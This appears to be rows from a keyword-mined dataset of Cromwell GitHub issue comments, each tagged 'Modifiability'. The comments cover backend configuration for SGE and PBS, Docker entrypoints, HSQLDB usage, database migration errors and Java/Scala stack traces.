'/cromwell_root/fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/''; AccessDeniedException: 403 xxx@xxx.gserviceaccount.com does not have storage.objects.list access to the Google Cloud Storage bucket.; ```; I am starting to guess that this is a settings issue with the bucket, not with my service account. My best guess is that, albeit extremely counter-intuitive, I have access to this bucket with my personal account but I do not have access to this bucket with my service account. Oh my, this is so complicated ... As for Terra, I have used it quite a bit for the last week but, and I am not alone in saying this, Terra is not a good environment for development of new WDLs. For example, just to upload a new WDL for testing it takes so many steps. ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665298885:2157,config,config,2157,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665298885,1,['config'],['config']
Modifiability,"rrors on our HPC that occur randomly and qsub/qstat go down temporarily and result in `failed (during ExecutingWorkflowState): java.lang.RuntimeException: Unable to start job.`. I was hoping this would retry failed submissions. . This is my current config:. ```; include required(classpath(""application"")). webservice {; port = 8000; interface = 127.0.0.1; }. #call-caching {; # enabled = true; # invalidate-bad-cache-results = true; #}. system {; job-rate-control {; jobs = 20; per = 1 second; }; }. backend {; default = SGE. providers {; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; concurrent-job-limit = 10; root = ""cromwell-executions""; run-in-background = true. default-runtime-attributes {; maxRetries: 3; }. runtime-attributes = """"""; String ? docker; String ? docker_user; """""". submit = ""/bin/bash ${script}"". submit-docker = """"""; docker run \; --rm -i \; ${""--user "" + docker_user} \; --entrypoint /bin/bash \; -v ${cwd}:${docker_cwd} \; ${docker} ${script}; """""". filesystems {; local {; localization: [; ""hard-link"", ""soft-link"", ""copy""; ]; caching {; duplication-strategy: [; ""hard-link"", ""soft-link"", ""copy""; ]; hashing-strategy: ""file""; check-sibling-md5: false; }; }; }; }; }. SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; root = ""cromwell-executions""; exit-code-timeout-seconds = 600; concurrent-job-limit = 100. default-runtime-attributes {; maxRetries: 3; }. runtime-attributes = """"""; Int cpu = 1; Float ? memory_gb; String sge_queue = ""dgdcloud.q""; String ? sge_project; """""". submit = """"""; qsub \; -terse \; -V \; -b n \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; -pe smp ${cpu} \; ${""-l h_vmem="" + memory_gb / cpu + ""g""} \; ${""-l mem_free="" + memory_gb / cpu + ""g""} \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; ${script}; """""". kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)""; }; }; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-511529362:1392,config,config,1392,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-511529362,3,"['Config', 'config']","['ConfigBackendLifecycleActorFactory', 'config']"
Modifiability,"s to emulate / implement should be further refined with respect to HSQLDB. Plugging in `file:` will absolutely work for ""hello world"". But if one runs cromwell(s) the wrong way the db may become corrupted/deadlocked negating the ability to call-cache. Many databases have minimal to no support for sharing an embedded instance between concurrent procs. SQLite has the most ""support"" afaik but a) would require _a lot_ of custom Cromwell code, and b) still has other issues such as in NFS environments. Depending on whomever this ticket is aimed at, if they're using an HPC environment like our methods users do we'd have to be careful not to store a multiprocess embedded DB on NFS. Today with HSQLDB `mem:` cromwell uses a pair of ephemeral database connection pools. I'm not sure the behavior if both pools are pointed at the same HSQLDB `file:`, but I think it might work as the docs only warn of connecting from multi-process not multi-pool. The default config mentioned in this ticket may still consider using separate `file:` instances just in case. All issues above have workarounds with varying degrees of difficulty and/or documentation warnings. For example one could clarify the documentation with ""Cromwell only supports one instance connecting to the pair of default _file:_ databases at a time."" Or: ""Cromwell only supports call caching when running a workflow with the same name"" because we did something like generate the db file based on the workflow name. Another option, instead of having multiple processes access the same embedded DB, is to research spinning up a background daemon db process, which do support multiple connections. Links to consider when defining acceptance criteria are below. . Re: our existing/proposed HSQLDB usage; - Cromwell's `database.metadata` and `database.engine` when absent both [fall back to the root `database` stanza.](https://github.com/broadinstitute/cromwell/blob/088e12d97dd18f463e6a387a6ffb002d9725cbe4/services/src/main/scala/cromwell/serv",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3786#issuecomment-398204194:1165,config,config,1165,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3786#issuecomment-398204194,1,['config'],['config']
Modifiability,"s.config.DispatchedConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:211); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); 	at akka.actor.ActorCell.invoke(ActorCell.scala:557); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); 	at akka.dispatch.Mailbox.run(Mailbox.scala:225); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:697); 	at scala.util.Try$.apply(Try.scala:209); 	... 25 more. [2019-02-13 22:18:20,91] [error] WorkflowManagerActor Workflow bc35173d-fde7-4727-8ae1-d4d3f132296c failed (during ExecutingWorkflowState): java.util.concurrent.ExecutionException: Boxed Error; 	at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); 	at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); 	at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); 	at scala.concurrent.Promise$.fromTry(Promise.scala:138); 	at scala.concurrent.Future$.fromTry(Future.scala:635); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:697); 	at cromwell.backe",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710:3505,Config,ConfigAsyncJobExecutionActor,3505,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); at akka.actor.Actor.aroundReceive(Actor.scala:517); at akka.actor.Actor.aroundReceive$(Actor.scala:515); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:211); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); at akka.actor.ActorCell.invoke(ActorCell.scala:557); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); at akka.dispatch.Mailbox.run(Mailbox.scala:225); at akka.dispatch.Mailbox.exec(Mailbox.scala:235); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:691); at scala.util.Try$.apply(Try.scala:209); ... 25 more; ```; This is our configuration for PBS:; ```; PBSPRO {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; ; runtime-attributes = """"""; Int cpu = 1; Int memory_mb = 2048; String queue = ""normal""; String account = """"; String walltime = ""48:00:00""; ; Int? cpuMin; Int? cpuMax; Int? memoryMin; Int? memoryMax; String? outDirMin; String? outDirMax; String? tmpDirMin; String? tmpDirMax; """"""; submit = """"""; qsub -V -l wd -N ${job_name} -o ${out} -e ${err} -q ${queue} -l walltime=${walltime} -l ncpus=${cpu} -l mem=${memory_mb}mb -- /usr/bin/env bash ${script};",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345:3892,config,config,3892,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345,1,['config'],['config']
Modifiability,scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:569) ~[cromwell.jar:0.19]; at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:568) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:251) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:249) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala:121) ~[cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618:5983,Adapt,AdaptedForkJoinTask,5983,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618,1,['Adapt'],['AdaptedForkJoinTask']
Modifiability,"seems like this was already implemented as a backend configuration option `glob-link-command`, so I simply updated the configuration example files to include an example of how to set `glob-link-command` to use soft-links instead. Was able to run on beeGFS with the updated configuration.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5250#issuecomment-549502892:53,config,configuration,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5250#issuecomment-549502892,3,['config'],['configuration']
Modifiability,services'; akka.actor.ActorInitializationException: akka://cromwell-system/user/cromwell-service/ServiceRegistryActor: exception during creation; 	at akka.actor.ActorInitializationException$.apply(Actor.scala:193); 	at akka.actor.ActorCell.create(ActorCell.scala:669); 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:523); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:545); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: com.typesafe.config.ConfigException$Missing: No configuration setting found for key 'services'; 	at com.typesafe.config.impl.SimpleConfig.findKeyOrNull(SimpleConfig.java:156); 	at com.typesafe.config.impl.SimpleConfig.findOrNull(SimpleConfig.java:174); 	at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:188); 	at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:193); 	at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:268); 	at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:41); 	at cromwell.services.ServiceRegistryActor$.serviceNameToPropsMap(ServiceRegistryActor.scala:35); 	at cromwell.services.ServiceRegistryActor.serviceProps(ServiceRegistryActor.scala:63); 	at cromwell.services.ServiceRegistryActor.<init>(ServiceRegistryActor.scala:65); 	at cromwell.services.ServiceRegistryActor$.$anonfun$props$1(ServiceRegistryActor.scala:25); 	at akka.actor.TypedCreatorFunctionConsumer.produce(IndirectActorProducer.scala:87); 	at akka.actor.Props.newActor(Props.scala:212); 	at akka.actor.ActorCell.newActor(ActorCell.scala:624); 	at akka.actor.ActorC,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881:1179,config,config,1179,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881,1,['config'],['config']
Modifiability,"set changesets/failure_metadata.xml::failure_to_message::cjllanwarne:; Reason: liquibase.exception.DatabaseException: Unknown column '%failures[%]%:failure' in 'where clause' [Failed SQL: UPDATE METADATA_ENTRY; SET METADATA_KEY = CONCAT(TRIM(TRAILING ':failure' FROM METADATA_KEY), "":message""); WHERE METADATA_KEY LIKE ""%failures[%]%:failure""]; 	at liquibase.changelog.ChangeSet.execute(ChangeSet.java:619); 	at liquibase.changelog.visitor.UpdateVisitor.visit(UpdateVisitor.java:51); 	at liquibase.changelog.ChangeLogIterator.run(ChangeLogIterator.java:79); 	at liquibase.Liquibase.update(Liquibase.java:214); 	at liquibase.Liquibase.update(Liquibase.java:192); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:62); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:34); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:155); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); Caused by: liquibase.exception.DatabaseException: Unknown column '%failures[%]%:failure' in 'where clause' [Failed SQL: UPDATE METADATA_ENTRY; SET METADATA_KEY = CONCAT(TRIM(TRAILING ':failure' FROM METADATA_KEY), "":message""); WHERE METADATA_KEY LIKE ""%failures[%]%:failure""]; 	at liquibase.executor.jvm.JdbcExecut",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459580103:1995,Enhance,EnhancedSqlDatabase,1995,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459580103,1,['Enhance'],['EnhancedSqlDatabase']
Modifiability,"src; ```. This syntax says ""find the section defined as defaults (above) and insert it here. ```; <<: *defaults; ```; so you don't write it twice!. This is similar, but it's like a named anchor and pointer. I might have this under a jobs step. ```; - run: *dothething; ```; which might be in reference to this. ```; dothething: &dothething; name: Do the thing; command: |; echo ""Do the thing!""; echo ""Do it again!""; ```. - The main runtime in the file is the workflow jobs section, which just does a build and deploy.; - the base container that is run is one of circle's ready to docker docker images `docker:18.01.0-ce-git`; - The main steps are to load cache, install dependencies, build the container, run to test, and then save the cache and deploy. That's really it :); - you interact with the environment by writing it to `BASH_ENV` and sourcing that, which needs to be done in each step separately (e.g., a ""run"" section); - most of the weird if statement logic is just to test if the user (you) has defined an environment variable (somewhere) and if not, go to default or just skip a step.; - the easiest way to ""read"" the file is to go to the bottom and start at ""workflows"" that describe the highest level of things, e.g. ""run all these steps under build, and trigger based on these filters and branches."" TLDR **workflows** define a dependency graph sort of deal.; - The details for the steps for each workflow are under ""jobs"" that are the seconds above that, so the names of jobs are going to correspond to workflows. In ""jobs"" you can then trace back up to find the corresponding step. TLDR **jobs** are all the steps of stuff to do.; - Steps that aren't found (e.g., checkout) are circle provided steps that you can read about in their docs --> https://circleci.com/docs/2.0/configuration-reference/. And importantly, in the beginning it all just looks weird. You will come back to the same file and be a little confused. This yaml business is weird, but I promise it clicks over time!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-415952635:2397,variab,variable,2397,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-415952635,2,"['config', 'variab']","['configuration-reference', 'variable']"
Modifiability,"ssue. PR #2280 fixes part of the problem, but only for the local backend. I am trying to use the official Picard docker:; https://hub.docker.com/r/broadinstitute/picard/~/dockerfile/. Here is a simplified version of my WDL for illustration purposes:. task picard{; command {; CollectAlignmentSummaryMetrics; }; runtime{; docker:""broadinstitute/picard""; }; }. workflow picardwf {; call picard; }. If I locally do; `docker run broadinstitute/picard CollectAlignmentSummaryMetrics`. I get the behavior I expect -- in this simplified example, it prints out the help command for CollectAlignmentSummaryMetrics. (The Dockerfile specifies an entrypoint that calls a script in the container and passes ""CollectAlignmentSummaryMetrics"" to it.). When running with the JES backend, however, I get:; '/tmp/ggp-298770331' is not a valid command. See PicardCommandLine -h for more information.'. Cromwell has inserted a file path immediately after the image name in the docker run command:; `Running command: docker run -v /tmp/ggp-298770331:/tmp/ggp-298770331 -v /mnt/local-disk:/cromwell_root -e exec=/cromwell_root/exec.sh -e picard-rc.txt=/cromwell_root/picard-rc.txt -e __extra_config_gcs_path=gs://<path_redacted> broadinstitute/picard@sha256:1ddf5888182718c55054c96dca6a5d65d23a703f98e66832400e4837d04854a7 /tmp/ggp-298770331`. I don't think this default behavior makes sense for any backend. It should either override the entrypoint by default (as the local backend now does) or -- this would be much better -- it would work with the existing entrypoint. A lot of published containers specify an entrypoint, which means when running in Cromwell they can't really be used as intended with that entrypoint. To get them running at all requires changing Cromwell's config to ignore the entrypoint, and then if you want to use the entrypoint you have to re-specify it as part of the command. Could you please consider changing the default behavior to make it compatible with entrypoints out of the box?. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2256#issuecomment-322892247:1897,config,config,1897,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2256#issuecomment-322892247,1,['config'],['config']
Modifiability,"stanza in the `engine` portion of the config I get the error from above. . If I remove it and only keep the sra stanza in the top level filesystems part of the config and an sra stanza in the backend filesystems portion of the config I then get the following error:. ```; [2020-08-24 17:31:17,07] [info] WorkflowManagerActor Workflow fbc40d55-a668-4fd8-982c-e53333ad04f5 failed (during ExecutingWorkflowState): java.lang.RuntimeException: Failed to evaluate 'tumor_only_reads_size' (reason 1 of 1): Evaluating ceil(size(tumor_reads, ""GB"")) failed: java.lang.IllegalArgumentException: Could not build the path ""sra://SRR2841273/SRR2841273"". It may refer to a filesystem not supported by this instance of Cromwell. Supported filesystems are: Google Cloud Storage, HTTP, LinuxFileSystem. Failures: ; Google Cloud Storage: Cloud Storage URIs must have 'gs' scheme: sra://SRR2841273/SRR2841273 (IllegalArgumentException); HTTP: sra://SRR2841273/SRR2841273 does not have an http or https scheme (IllegalArgumentException); LinuxFileSystem: Cannot build a local path from sra://SRR2841273/SRR2841273 (RuntimeException); Please refer to the documentation for more information on how to configure filesystems: http://cromwell.readthedocs.io/en/develop/backends/HPC/#filesystems; 	at cromwell.engine.workflow.lifecycle.execution.keys.ExpressionKey.processRunnable(ExpressionKey.scala:29); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.$anonfun$startRunnableNodes$7(WorkflowExecutionActor.scala:538); 	at cats.instances.ListInstances$$anon$1.$anonfun$traverse$2(list.scala:74); 	at cats.instances.ListInstances$$anon$1.loop$2(list.scala:64); 	at cats.instances.ListInstances$$anon$1.$anonfun$foldRight$1(list.scala:64); 	at cats.Eval$.loop$1(Eval.scala:338); 	at cats.Eval$.cats$Eval$$evaluate(Eval.scala:368); 	at cats.Eval$Defer.value(Eval.scala:257); 	at cats.instances.ListInstances$$anon$1.traverse(list.scala:73); 	at cats.instances.ListInstances$$anon$1.traverse(list.scala:12); ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679437852:1205,config,configure,1205,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679437852,1,['config'],['configure']
Modifiability,"stem. Shutting down Cromwell.; liquibase.exception.MigrationFailedException: Migration failed for change set changesets/failure_metadata.xml::failure_to_message::cjllanwarne:; Reason: liquibase.exception.DatabaseException: Unknown column '%failures[%]%:failure' in 'where clause' [Failed SQL: UPDATE METADATA_ENTRY; SET METADATA_KEY = CONCAT(TRIM(TRAILING ':failure' FROM METADATA_KEY), "":message""); WHERE METADATA_KEY LIKE ""%failures[%]%:failure""]; 	at liquibase.changelog.ChangeSet.execute(ChangeSet.java:619); 	at liquibase.changelog.visitor.UpdateVisitor.visit(UpdateVisitor.java:51); 	at liquibase.changelog.ChangeLogIterator.run(ChangeLogIterator.java:79); 	at liquibase.Liquibase.update(Liquibase.java:214); 	at liquibase.Liquibase.update(Liquibase.java:192); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:62); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:34); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:155); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); Caused by: liquibase.exception.DatabaseException: Unknown column '%failures[%]%:failure' in 'where clause' [Failed SQL: UPDATE METADATA_ENTRY; SET METADATA_KEY = CONCAT(TRIM(TRAILING ':failure' FROM METADATA_K",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459580103:1890,Enhance,EnhancedSqlDatabase,1890,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459580103,1,['Enhance'],['EnhancedSqlDatabase']
Modifiability,"still persist in cromwell 75.; Also in my case I'd like to configure docker memory usage and docker reqiers suffix ""g"" or ""m"" after the number, so the @DavyCats trick does not work here",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4659#issuecomment-1030686093:59,config,configure,59,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4659#issuecomment-1030686093,1,['config'],['configure']
Modifiability,syncExecutionActor.scala:515); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand$lzycompute(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents(StandardAsyncExecutionActor.scala:317); 	at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents$(StandardAsyncExecutionActor.scala:316); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.commandScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents(SharedFileSystemAsyncJobExecutionActor.scala:175); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents$(SharedFileSystemAsyncJobExecutionActor.scala:174); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.cromwell$backend$sfs$BackgroundAsyncJobExecutionActor$$super$writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents(BackgroundAsyncJobExecutionActor.scala:12); 	at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents$(BackgroundAsyncJobExecutionActor.scala:11); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute(SharedFileSystemAsyncJobExecutionActor.scala:158); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:155); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211:1506,config,config,1506,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211,1,['config'],['config']
Modifiability,"t added to CUSTOM_LABEL_ENTRY(CUSTOM_LABEL_KEY, WORKFLOW_EXECUTION_UUID); 2018-06-07 12:16:11,094 INFO - sql_metadata_changelog.xml: metadata_changesets/delete_duplicate_custom_labels.xml::delete_duplicate_custom_labels::kshakir: ChangeSet metadata_changesets/delete_duplicate_custom_labels.xml::delete_duplicate_custom_labels::kshakir ran successfully in 2ms; 2018-06-07 12:16:11,095 INFO - Successfully released change log lock; 2018-06-07 12:16:11,332 INFO - Slf4jLogger started; 2018-06-07 12:16:11,499 cromwell-system-akka.dispatchers.engine-dispatcher-4 INFO - Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-6c9b8d4"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; 2018-06-07 12:16:11,540 cromwell-system-akka.dispatchers.service-dispatcher-10 INFO - Metadata summary refreshing every 2 seconds.; 2018-06-07 12:16:11,574 cromwell-system-akka.dispatchers.service-dispatcher-8 INFO - WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; 2018-06-07 12:16:11,575 cromwell-system-akka.actor.default-dispatcher-2 INFO - KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; 2018-06-07 12:16:11,575 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - JobStoreWriterActor configured to flush with batch size 1000 and process rate 1 second.; 2018-06-07 